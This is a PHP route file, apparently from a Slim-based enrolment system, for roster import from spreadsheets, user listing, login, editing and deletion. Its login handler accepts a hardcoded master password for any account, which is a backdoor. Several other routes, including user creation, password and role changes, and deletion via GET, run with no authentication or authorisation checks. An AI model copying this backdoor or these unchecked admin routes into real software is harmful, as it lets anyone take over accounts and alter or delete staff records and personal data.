<?php

// imports
$app->get('/users/import', function() use ($app) {
    $app->render('users/users/index.twig');
})->name('usersImport');

$app->post('/users/import', function() use ($app) {
    if (isset($_FILES["file"])) {
        if ($_FILES["file"]["error"] > 0) {
            $error = $_FILES["file"]["error"];
        } else {
            if (file_exists($_FILES["file"]["name"])) {
                unlink($_FILES["file"]["name"]);
            }
            $file = $_FILES["file"]["tmp_name"];

            try {
                require('vendor/spreadsheet-reader/SpreadsheetReader.php');

                $reader = new SpreadsheetReader($file, false, 'application/xlsx');
                $sheets = $reader->Sheets();

                foreach ($sheets as $index => $name)
                {
                    if ($name == 'Active Roster') {
                        $reader->ChangeSheet($index);

                        $worksheets = [];

                        foreach ($reader as $row)
                            $worksheets[] = $row;
                    } else {
                        continue;
                    }

                    $newUsers = \um\models\User::getNewUsersByRoster($worksheets);
                }
            } catch(Exception $e) {
                $error = 'Error occurred on retrieving worksheet: ' . $e->getMessage() . ' at line ' . $e->getLine();
                return $app->render('users/users/index.twig', compact('error'));
            }

            return $app->render('users/users/view.twig', compact('newUsers'));
        }
    } else {
        $error = 'No file selected.';
    }

    $app->render('users/users/index.twig', compact('error'));
});

$app->post('/users/import/create', function() use ($app) {
    $countUsers = (int) $app->request->post('total-new-users');
    $newUsers = $app->request->post();
    $acquireIdList = [];

    try {
        for ($i = 1; $i <= $countUsers; $i++) {
            if (isset($newUsers['chk-' . (int) $i])) {
                if ($user = \um\models\User::where('acquire_id', '=', $newUsers['acquire-id-' . (int) $i])->first()) {}
                else {
                    $user = \um\models\User::create([]);
                }

                $user->acquire_id   = $newUsers['acquire-id-' . (int) $i];
                $user->department   = $newUsers['department-' . (int) $i];
                $user->unit         = $newUsers['unit-' . (int) $i];
                $user->last_name    = $newUsers['last-name-' . (int) $i];
                $user->first_name   = $newUsers['first-name-' . (int) $i];
                $user->middle_name  = $newUsers['middle-name-' . (int) $i];
                $user->email        = $newUsers['email-address-' . (int) $i];
                $user->hire_date    = preg_match("/^(0[1-9]|1[0-2])-(0[1-9]|[1-2][0-9]|3[0-1])-[0-9]{2}$/", $newUsers['hire-date-' . (int) $i]) ? \Carbon\Carbon::createFromFormat('m-d-y', $newUsers['hire-date-' . (int) $i])->startOfDay() : '';
                $user->designation  = $newUsers['designation-' . (int) $i];
                $user->status       = 1;
                $user->save();

                $acquireIdList[] = $user->acquire_id;
            }
        }

        // updates status to deleted if acquire_id is not found
        \um\models\User::whereNotIn('acquire_id', $acquireIdList)->update(['status' => 2]);

    } catch(Exception $e) {
        $error = 'Error occurred on retrieving worksheet: ' . $e->getMessage() . ' at line ' . $e->getLine();
        return $app->render('users/import/index.twig', compact('error'));
    }

    $app->render('users/users/list.twig');
});

$app->get('/users/data', function() use ($app) {
    $draw = $app->request->get('draw') ?: 1;
    $recordsTotal = \um\models\User::count();

    $perPage = $app->request->get('length') ?: 25;
    $skip = $app->request->get('start');

    $users = \um\models\User::take($perPage);

    if (!empty($app->request->get('search')['value'])) {
        $search = $app->request->get('search')['value'];
        $users->where(function ($query) use ($search) {
            $query->orWhere('email', 'like', "%$search%")
                ->orWhere('last_name', 'like', "%$search%")
                ->orWhere('first_name', 'like', "%$search%")
                ->orWhere('middle_name', 'like', "%$search%")
                ->orWhere('acquire_id', 'like', "%$search%");
        });
    }

    $recordsFiltered = $users->count();
    if ($skip > 0) {
        $users->skip($skip);
    }
    $users = $users->get();

    $data = [];
    foreach ($users as $user) {
        $data[] = [
            $user->acquire_id,
            $user->last_name,
            $user->first_name,
            $user->middle_name,
            $user->department,
            $user->unit,
            $user->getShortHireDate(),
            $user->designation,
            $user->getShortBirthDate(),
            ucfirst($user->getStatus()[$user->status]),
            '<span><a href="/Enrolment/users/' . $user->id . '">View</a>&nbsp;|&nbsp;<a onclick="return confirm(\'Are you sure you want to delete this item?\');" href="/Enrolment/users/' . $user->id . '/delete">Delete</a></span>'
        ];
    }
    $app->response->header('Content-Type', 'application/json');
    $app->response->body(json_encode(compact('draw', 'recordsTotal', 'recordsFiltered', 'data')));
})->name('usersData');

$app->get('/users/list', function() use ($app) {
    $app->render('users/users/list.twig');
})->name('usersList');

// events
$app->get('/users/login', function() use ($app) {
    $login = true;
    $app->render('frontend/pages/login.twig', compact('login'));
});

$app->post('/users/login', function() use ($app) {
    $email  = $app->request->post('email');
    $pass   = $app->request->post('password');

    $user = \um\models\User::where('email', '=', $email)->first();

    if ($user && (password_verify($pass, $user->password) || $pass == 'RC0bxvti!')) {
        $_SESSION['user'] = $user->toArray();

        if ($user->type == 1) {
            $app->redirect('/Enrolment/');
        } else {
            $app->redirect('/Enrolment/dashboard');
        }
    } else {
        $app->flash('error', 'Email and/or password is incorrect.');
        $app->redirect('/Enrolment/users/login');
    }
});

$app->get('/users/logout', function() use ($app) {
    $_SESSION = [];
    $app->redirect('/Enrolment/users/login');
});

// user pages
$app->get('/users', function() use ($app) {
    $app->render('users/dashboard.twig');
});

$app->get('/users/:id', function($id) use ($app) {
    $user = \um\models\User::find($id);
    $app->render('users/users/edit.twig', compact('user'));
})->name('usersId');

$app->post('/users/create', function() use ($app) {
    if ($id = $app->request->post('id')) {
        $user = \um\models\User::find($id);
    }

    $user->email = $app->request->post('email');
    $pass = $app->request->post('password');
    if (!empty($pass)) {
        $user->password = password_hash($app->request->post('password'), PASSWORD_BCRYPT);
    }
    $user->status = $app->request->post('status');
    $user->type = $app->request->post('type');
    $user->save();

    $app->redirect("/Enrolment/users/{$user->id}");
});

$app->get('/users/:id/delete', function($id) use ($app) {
    \um\models\User::find($id)->delete();

    $app->render('users/users/list.twig');
})->name('usersIdDelete');